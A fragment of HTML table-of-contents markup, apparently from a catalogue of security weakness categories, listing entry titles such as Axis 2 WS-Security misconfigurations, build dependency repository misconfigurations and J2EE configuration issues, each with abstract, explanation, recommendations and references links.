class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-165"><span class="toc-number">1.4.24.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-164"><span class="toc-number">1.4.24.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-163"><span class="toc-number">1.4.24.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Requester-Misconfiguration-Unsigned-Inbound-Timestamp"><span class="toc-number">1.4.25.</span> <span class="toc-text">Axis 2 Service Requester Misconfiguration: Unsigned Inbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-165"><span class="toc-number">1.4.25.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-166"><span class="toc-number">1.4.25.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-165"><span class="toc-number">1.4.25.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-164"><span class="toc-number">1.4.25.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Requester-Misconfiguration-Unsigned-Outbound-Timestamp"><span class="toc-number">1.4.26.</span> <span class="toc-text">Axis 2 Service Requester Misconfiguration: Unsigned Outbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-166"><span class="toc-number">1.4.26.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-167"><span class="toc-number">1.4.26.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-166"><span class="toc-number">1.4.26.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-165"><span class="toc-number">1.4.26.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Requester-Misconfiguration-WS-Security-Not-Enabled"><span class="toc-number">1.4.27.</span> <span class="toc-text">Axis 2 Service Requester Misconfiguration: WS-Security Not Enabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-167"><span class="toc-number">1.4.27.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-168"><span class="toc-number">1.4.27.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-167"><span class="toc-number">1.4.27.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-166"><span class="toc-number">1.4.27.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Requester-Misconfiguration-Weak-Token"><span class="toc-number">1.4.28.</span> <span class="toc-text">Axis 2 Service Requester Misconfiguration: Weak Token</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-168"><span class="toc-number">1.4.28.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-169"><span class="toc-number">1.4.28.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-168"><span class="toc-number">1.4.28.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-167"><span class="toc-number">1.4.28.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-Misconfiguration-Debug-Information"><span class="toc-number">1.4.29.</span> <span class="toc-text">Axis Misconfiguration: Debug Information</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-169"><span class="toc-number">1.4.29.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-170"><span class="toc-number">1.4.29.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-169"><span class="toc-number">1.4.29.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-168"><span class="toc-number">1.4.29.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-Misconfiguration-Service-Enumeration"><span class="toc-number">1.4.30.</span> <span class="toc-text">Axis Misconfiguration: Service Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-170"><span class="toc-number">1.4.30.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-171"><span class="toc-number">1.4.30.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-170"><span class="toc-number">1.4.30.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-169"><span class="toc-number">1.4.30.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-Service-Provider-Misconfiguration-Plain-Text-Password"><span class="toc-number">1.4.31.</span> <span class="toc-text">Axis Service Provider Misconfiguration: Plain Text Password</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-171"><span class="toc-number">1.4.31.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-172"><span class="toc-number">1.4.31.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-171"><span class="toc-number">1.4.31.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-170"><span class="toc-number">1.4.31.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-Service-Provider-Misconfiguration-Weak-Token"><span class="toc-number">1.4.32.</span> <span class="toc-text">Axis Service Provider Misconfiguration: Weak Token</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-172"><span class="toc-number">1.4.32.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-173"><span class="toc-number">1.4.32.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-172"><span class="toc-number">1.4.32.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-171"><span class="toc-number">1.4.32.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-Service-Requester-Misconfiguration-Plain-Text-Password"><span class="toc-number">1.4.33.</span> <span class="toc-text">Axis Service Requester Misconfiguration: Plain Text Password</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-173"><span class="toc-number">1.4.33.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-174"><span class="toc-number">1.4.33.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-173"><span class="toc-number">1.4.33.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-172"><span class="toc-number">1.4.33.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-Service-Requester-Misconfiguration-Weak-Token"><span class="toc-number">1.4.34.</span> <span class="toc-text">Axis Service Requester Misconfiguration: Weak Token</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-174"><span class="toc-number">1.4.34.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-175"><span class="toc-number">1.4.34.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-174"><span class="toc-number">1.4.34.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-173"><span class="toc-number">1.4.34.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Build-Misconfiguration-Dynamic-Dependency-Version-Usage"><span class="toc-number">1.4.35.</span> <span class="toc-text">Build Misconfiguration: Dynamic Dependency Version Usage</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-175"><span class="toc-number">1.4.35.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-176"><span class="toc-number">1.4.35.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-175"><span class="toc-number">1.4.35.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-174"><span class="toc-number">1.4.35.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Build-Misconfiguration-External-Ant-Dependency-Repository"><span class="toc-number">1.4.36.</span> <span class="toc-text">Build Misconfiguration: External Ant Dependency Repository</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-176"><span class="toc-number">1.4.36.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-177"><span class="toc-number">1.4.36.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-176"><span class="toc-number">1.4.36.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-175"><span class="toc-number">1.4.36.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Build-Misconfiguration-External-Ivy-Dependency-Repository"><span class="toc-number">1.4.37.</span> <span class="toc-text">Build Misconfiguration: External Ivy Dependency Repository</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-177"><span class="toc-number">1.4.37.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-178"><span class="toc-number">1.4.37.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-177"><span class="toc-number">1.4.37.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-176"><span class="toc-number">1.4.37.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Build-Misconfiguration-External-Maven-Dependency-Repository"><span class="toc-number">1.4.38.</span> <span class="toc-text">Build Misconfiguration: External Maven Dependency Repository</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-178"><span class="toc-number">1.4.38.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-179"><span class="toc-number">1.4.38.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-178"><span class="toc-number">1.4.38.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-177"><span class="toc-number">1.4.38.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ClassLoader-Manipulation-Struts-1"><span class="toc-number">1.4.39.</span> <span class="toc-text">ClassLoader Manipulation: Struts 1</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-179"><span class="toc-number">1.4.39.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-180"><span class="toc-number">1.4.39.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-179"><span class="toc-number">1.4.39.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-178"><span class="toc-number">1.4.39.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Flex-Misconfiguration-Debug-Information"><span class="toc-number">1.4.40.</span> <span class="toc-text">Flex Misconfiguration: Debug Information</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-180"><span class="toc-number">1.4.40.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-181"><span class="toc-number">1.4.40.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-180"><span class="toc-number">1.4.40.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-179"><span class="toc-number">1.4.40.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-MIME-Sniffing"><span class="toc-number">1.4.41.</span> <span class="toc-text">HTML5: MIME Sniffing</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-181"><span class="toc-number">1.4.41.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-182"><span class="toc-number">1.4.41.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-181"><span class="toc-number">1.4.41.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-180"><span class="toc-number">1.4.41.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Cookies-Disabled"><span class="toc-number">1.4.42.</span> <span class="toc-text">J2EE Misconfiguration: Cookies Disabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-182"><span class="toc-number">1.4.42.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-183"><span class="toc-number">1.4.42.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-182"><span class="toc-number">1.4.42.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-181"><span class="toc-number">1.4.42.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Debug-Information"><span class="toc-number">1.4.43.</span> <span class="toc-text">J2EE Misconfiguration: Debug Information</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-183"><span class="toc-number">1.4.43.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-184"><span class="toc-number">1.4.43.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-183"><span class="toc-number">1.4.43.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-182"><span class="toc-number">1.4.43.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Direct-JSP-Access"><span class="toc-number">1.4.44.</span> <span class="toc-text">J2EE Misconfiguration: Direct JSP Access</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-184"><span class="toc-number">1.4.44.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-185"><span class="toc-number">1.4.44.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-184"><span class="toc-number">1.4.44.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-183"><span class="toc-number">1.4.44.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Duplicate-Security-Role"><span class="toc-number">1.4.45.</span> <span class="toc-text">J2EE Misconfiguration: Duplicate Security Role</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-185"><span class="toc-number">1.4.45.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-186"><span class="toc-number">1.4.45.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-185"><span class="toc-number">1.4.45.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-184"><span class="toc-number">1.4.45.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Duplicate-Servlet-Mapping"><span class="toc-number">1.4.46.</span> <span class="toc-text">J2EE Misconfiguration: Duplicate Servlet Mapping</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-186"><span class="toc-number">1.4.46.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-187"><span class="toc-number">1.4.46.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-186"><span class="toc-number">1.4.46.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-185"><span class="toc-number">1.4.46.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Excessive-Servlet-Mappings"><span class="toc-number">1.4.47.</span> <span class="toc-text">J2EE Misconfiguration: Excessive Servlet Mappings</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-187"><span class="toc-number">1.4.47.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-188"><span class="toc-number">1.4.47.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-187"><span class="toc-number">1.4.47.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-186"><span class="toc-number">1.4.47.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Excessive-Session-Timeout"><span class="toc-number">1.4.48.</span> <span class="toc-text">J2EE Misconfiguration: Excessive Session Timeout</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-188"><span class="toc-number">1.4.48.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-189"><span class="toc-number">1.4.48.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-188"><span class="toc-number">1.4.48.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-187"><span class="toc-number">1.4.48.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Incomplete-Error-Handling"><span class="toc-number">1.4.49.</span> <span class="toc-text">J2EE Misconfiguration: Incomplete Error Handling</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-189"><span class="toc-number">1.4.49.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-190"><span class="toc-number">1.4.49.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-189"><span class="toc-number">1.4.49.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-188"><span class="toc-number">1.4.49.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Incomplete-Error-Handling-404"><span class="toc-number">1.4.50.</span> <span class="toc-text">J2EE Misconfiguration: Incomplete Error Handling - (404)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-190"><span class="toc-number">1.4.50.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-191"><span class="toc-number">1.4.50.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-190"><span class="toc-number">1.4.50.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-189"><span class="toc-number">1.4.50.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Incomplete-Error-Handling-500"><span class="toc-number">1.4.51.</span> <span class="toc-text">J2EE Misconfiguration: Incomplete Error Handling - (500)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-191"><span class="toc-number">1.4.51.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-192"><span class="toc-number">1.4.51.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-191"><span class="toc-number">1.4.51.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-190"><span class="toc-number">1.4.51.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Incomplete-Error-Handling-throwable"><span class="toc-number">1.4.52.</span> <span class="toc-text">J2EE Misconfiguration: Incomplete Error Handling - (throwable)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-192"><span class="toc-number">1.4.52.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-193"><span class="toc-number">1.4.52.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-192"><span class="toc-number">1.4.52.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-191"><span class="toc-number">1.4.52.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Insufficient-Session-ID-Length"><span class="toc-number">1.4.53.</span> <span class="toc-text">J2EE Misconfiguration: Insufficient Session ID Length</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-193"><span class="toc-number">1.4.53.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-194"><span class="toc-number">1.4.53.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-193"><span class="toc-number">1.4.53.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-192"><span class="toc-number">1.4.53.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Invalid-Servlet-Name"><span class="toc-number">1.4.54.</span> <span class="toc-text">J2EE Misconfiguration: Invalid Servlet Name</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-194"><span class="toc-number">1.4.54.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-195"><span class="toc-number">1.4.54.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-194"><span class="toc-number">1.4.54.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-193"><span class="toc-number">1.4.54.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Missing-Authentication-Method"><span class="toc-number">1.4.55.</span> <span class="toc-text">J2EE Misconfiguration: Missing Authentication Method</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-195"><span class="toc-number">1.4.55.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-196"><span class="toc-number">1.4.55.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-195"><span class="toc-number">1.4.55.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-194"><span class="toc-number">1.4.55.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Missing-Data-Transport-Constraint"><span class="toc-number">1.4.56.</span> <span class="toc-text">J2EE Misconfiguration: Missing Data Transport Constraint</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-196"><span class="toc-number">1.4.56.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-197"><span class="toc-number">1.4.56.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-196"><span class="toc-number">1.4.56.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-195"><span class="toc-number">1.4.56.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Missing-Error-Handling"><span class="toc-number">1.4.57.</span> <span class="toc-text">J2EE Misconfiguration: Missing Error Handling</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-197"><span class="toc-number">1.4.57.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-198"><span class="toc-number">1.4.57.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-197"><span class="toc-number">1.4.57.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-196"><span class="toc-number">1.4.57.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Missing-Filter-Definition"><span class="toc-number">1.4.58.</span> <span class="toc-text">J2EE 